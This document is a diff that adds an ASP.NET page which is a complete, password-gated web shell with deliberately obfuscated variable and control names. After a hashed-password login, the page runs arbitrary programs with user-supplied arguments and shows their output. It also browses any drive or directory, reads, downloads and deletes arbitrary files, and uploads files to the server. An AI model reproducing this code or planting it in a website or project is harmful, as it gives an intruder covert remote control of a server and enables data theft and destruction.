@@ -1,0 +1,231 @@
+<%@ Page Language="C#" EnableViewState="false" %>
+<%@ Import Namespace="System.Web.UI.WebControls" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+
+<script Language="c#" runat="server">
+   protected void fdgfdgdfgfdg(object sender, EventArgs e)
+    {
+        string userss=FormsAuthentication.HashPasswordForStoringInConfigFile(fdgdfgfdgsewrw.Text,"MD5").ToLower();
+        if (userss == "52a04efc6a0e7facf34dcc36a6d1ce6f")
+        {
+
+            HttpCookie sdfdsffyusdftydfdshg = new HttpCookie("sdfdsffyusdftydfdshg");  
+            sdfdsffyusdftydfdshg.Values["twitter"] = "twitter";  
+            sdfdsffyusdftydfdshg.Expires = DateTime.Now.AddHours(2);
+            Response.Cookies.Add(sdfdsffyusdftydfdshg); 
+            uiweyryewuryewruyw.Visible = true;
+            uiweyryewuryewruyw.Enabled = true;
+            jkhdsfdkjsfhsdkjhfjdskhf.Visible = false;
+        }
+    }
+
+    protected override void OnInit(EventArgs e)
+    {
+        try
+        {
+            HttpCookie reqCookies = Request.Cookies["sdfdsffyusdftydfdshg"];  
+            if ((reqCookies["twitter"]).ToString() == "twitter")
+            {  
+                uiweyryewuryewruyw.Visible = true;
+                uiweyryewuryewruyw.Enabled = true;
+                jkhdsfdkjsfhsdkjhfjdskhf.Visible = false;
+            }
+            else{throw new Exception((reqCookies).ToString());}
+        }
+        catch (Exception ex)
+        {
+            uiweyryewuryewruyw.Visible = false;
+            uiweyryewuryewruyw.Enabled = false;
+            jkhdsfdkjsfhsdkjhfjdskhf.Visible = true;
+        }
+    }
+</script>
+<%
+    string dfgdfugyeuiyrehturehvuerit = "";
+    string tempstrdsfsdfewrwer = "";
+    string skjdhfjsdhffeyrweifwjh = Page.MapPath(".") + "/";
+    if (Request.QueryString["fdir"] != null)
+        skjdhfjsdhffeyrweifwjh = Request.QueryString["fdir"] + "/";
+    skjdhfjsdhffeyrweifwjh = skjdhfjsdhffeyrweifwjh.Replace("\\", "/");
+    skjdhfjsdhffeyrweifwjh = skjdhfjsdhffeyrweifwjh.Replace("//", "/");
+    string[] dirparts = skjdhfjsdhffeyrweifwjh.Split('/');
+    string linkwalk = "";   
+    foreach (string curpart in dirparts)
+    {
+        if (curpart.Length == 0)
+            continue;
+        linkwalk += curpart + "/";
+        dfgdfugyeuiyrehturehvuerit += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;",
+                                    HttpUtility.UrlEncode(linkwalk),
+                                    HttpUtility.HtmlEncode(curpart));
+    }
+    lblPath.Text = dfgdfugyeuiyrehturehvuerit;
+    
+    dfgdfugyeuiyrehturehvuerit = "";
+    foreach(DriveInfo curdrive in DriveInfo.GetDrives())
+    {
+        if (!curdrive.IsReady)
+            continue;
+        string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
+        dfgdfugyeuiyrehturehvuerit += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;",
+                                    HttpUtility.UrlEncode(driveRoot),
+                                    HttpUtility.HtmlEncode(driveRoot));
+    }
+    lblDrives.Text = dfgdfugyeuiyrehturehvuerit;
+    if ((Request.QueryString["uerihegyugefhsh"] != null) && (Request.QueryString["uerihegyugefhsh"].Length > 0)){
+        try
+        {
+            if (Request.QueryString["uerihegyugefhsh"] == null)
+            {
+                lblDirOut.Text =  "No file supplied";
+            }
+            string file = Request.QueryString["uerihegyugefhsh"];
+            if (File.Exists(file) == false)
+            {
+                lblDirOut.Text =  "File does not exist";
+            }
+            Response.ClearContent();
+            Response.ClearHeaders();
+            Response.Clear();
+            Response.ContentType = "application/octet-stream";
+            Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(file));
+            Response.AddHeader("Content-Length", new FileInfo(file).Length.ToString());
+            Response.WriteFile(file);
+            Response.Flush();
+            Response.Close();
+            lblDirOut.Text =  "File downloaded";
+        }
+
+        catch (Exception ex)
+        {
+           lblDirOut.Text =  ex.ToString();
+        }
+    }
+    if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
+    {
+        Response.ClearContent();
+        Response.WriteFile(Request.QueryString["get"]);
+        Response.End();
+    }
+    if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
+        File.Delete(Request.QueryString["del"]);    
+    if(flUp.HasFile)
+    {
+        string fileName = flUp.FileName;
+        int splitAt = ((fileName).ToString()).LastIndexOfAny(new char[] { '/', '\\' });
+        if (splitAt >= 0)
+            fileName = fileName.Substring(splitAt);
+        flUp.SaveAs(skjdhfjsdhffeyrweifwjh + "/" + fileName);
+    }
+    DirectoryInfo di = new DirectoryInfo(skjdhfjsdhffeyrweifwjh);
+    dfgdfugyeuiyrehturehvuerit = "";
+    foreach (DirectoryInfo curdir in di.GetDirectories())
+    {
+        tempstrdsfsdfewrwer =  curdir.Name;
+        string fstr = string.Format("<a href='?fdir={0}'>{1}</a>",
+                                    HttpUtility.UrlEncode(skjdhfjsdhffeyrweifwjh + "/" + tempstrdsfsdfewrwer),
+                                    HttpUtility.HtmlEncode(tempstrdsfsdfewrwer));
+        dfgdfugyeuiyrehturehvuerit += string.Format("<tr class=\"sdfsdfewr\"><td>{0}</td><td>&lt;DIR&gt;</td><td></td><td></td></tr>", fstr);
+    }
+    foreach (FileInfo curfile in di.GetFiles())
+    {
+        tempstrdsfsdfewrwer =  curfile.Name;
+        string fstr = string.Format("<a href='?get={0}' target='_blank'>{1}</a>",
+                                    HttpUtility.UrlEncode(skjdhfjsdhffeyrweifwjh + "/" + tempstrdsfsdfewrwer),
+                                    HttpUtility.HtmlEncode(tempstrdsfsdfewrwer));
+        string astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>",
+                                    HttpUtility.UrlEncode(skjdhfjsdhffeyrweifwjh),
+                                    HttpUtility.UrlEncode(skjdhfjsdhffeyrweifwjh + "/" + curfile.Name));
+        string dwn = string.Format("<a href='?fdir={0}&uerihegyugefhsh={1}'>Download</a>",  HttpUtility.UrlEncode(skjdhfjsdhffeyrweifwjh), HttpUtility.UrlEncode(skjdhfjsdhffeyrweifwjh + "/" + tempstrdsfsdfewrwer));
+        dfgdfugyeuiyrehturehvuerit += string.Format("<tr class=\"sdfsdfewr\"><td>{0}</td><td>{1:d}</td><td>{2}</td><td>{3}</td></tr>", fstr, curfile.Length / 1024, astr,dwn);
+    }
+    lblDirOut.Text = dfgdfugyeuiyrehturehvuerit;
+    if (sdfsdfsdfs.Text.Length > 0)
+    {
+        try{
+            ProcessStartInfo sdfyudsfdsgfhdsfhsdfsjsdha = new ProcessStartInfo();
+            sdfyudsfdsgfhdsfhsdfsjsdha.FileName = sdfdsfsdfgtfrhrttr.Text;
+            sdfyudsfdsgfhdsfhsdfsjsdha.Arguments = sdfsdfsdfs.Text;
+            sdfyudsfdsgfhdsfhsdfsjsdha.RedirectStandardOutput = true;
+            sdfyudsfdsgfhdsfhsdfsjsdha.RedirectStandardError = true;
+            sdfyudsfdsgfhdsfhsdfsjsdha.UseShellExecute = false;
+            sdfyudsfdsgfhdsfhsdfsjsdha.WorkingDirectory = skjdhfjsdhffeyrweifwjh;
+            Process fdvfdg = Process.Start(sdfyudsfdsgfhdsfhsdfsjsdha);
+            StreamReader stmrdr = fdvfdg.StandardOutput;
+            StreamReader stmrdr2 = fdvfdg.StandardError;
+            string s = stmrdr.ReadToEnd();
+            string s2 = stmrdr2.ReadToEnd();
+            stmrdr.Close();
+            stmrdr2.Close();
+            dfgkudugie.Text = s + s2;
+        }catch (Exception fdsf)
+        {
+            dfgkudugie.Text = fdsf.ToString();
+        }
+    }   
+%>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head>
+    <style type="text/css">
+        * { font-family: Arial; font-size: 12px; }
+        body { margin: 0px; }
+        pre { font-family: Courier New; background-color: #CCCCCC; }
+        h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
+        h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
+        th { text-align: left; background-color: #99CC99; }
+        pre { margin: 2px; }
+        table {border-collapse: collapse;width: 100%;}
+        tr:nth-child(even) { background-color: #c5ccf2;}
+        th, td {padding: 8px;  text-align: left;  border-bottom: 1px solid black;}
+        .sdfsdfewr:hover {background-color:#aa5795;}
+    </style>
+</head>
+<body>
+    <form id="form1" runat="server">
+        <asp:Panel ID="jkhdsfdkjsfhsdkjhfjdskhf" runat="server" HorizontalAlign="Center" style="margin: 10%;">
+            <asp:TextBox ID="fdgdfgfdgsewrw" TextMode="Password" runat="server" style="margin-left: 0px" Width="300px"></asp:TextBox> <br />
+            <asp:Button ID="Login" runat="server" Text="###" OnClick="fdgfdgdfgfdg" Width="101px" style="margin-up: 20px"/><br />
+        </asp:Panel>
+        <asp:Panel ID="uiweyryewuryewruyw" runat="server" >
+            <table style="width: 100%; border-width: 0px; padding: 5px;">
+        <tr>
+            <td style="background-color:#eae5d2;width: 50%; vertical-align: top;">
+                <asp:TextBox runat="server" ID="sdfdsfsdfgtfrhrttr" Width="700" />
+                <asp:TextBox runat="server" ID="sdfsdfsdfs" Width="700" />
+                <asp:Button runat="server" ID="dsfsdfs" Text="sdfsdfsdfds" />
+                <pre><asp:Literal runat="server" ID="dfgkudugie" Mode="Encode" /></pre>
+            </td>
+            <td style="width: 50%; vertical-align: top;">
+                <h2>File Browser</h2>
+                <p>
+                    Drives:<br />
+                    <asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
+                </p>
+                <p>
+                    Working directory:<br />
+                    <b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
+                </p>
+                <table style="width: 100%">
+                    <tr>
+                        <th>Name</th>
+                        <th>Size KB</th>
+                        <th style="width: 50px">Actions</th>
+                        <th ></th>
+                    </tr>
+                    <asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
+                </table>
+                <p>Upload to this directory:<br />
+                <asp:FileUpload runat="server" ID="flUp" />
+                <asp:Button runat="server" ID="u" Text="Upload" />
+                </p>
+            </td>
+        </tr>
+            </table>
+        </asp:Panel>
+    </form>
+</body>
+</html>
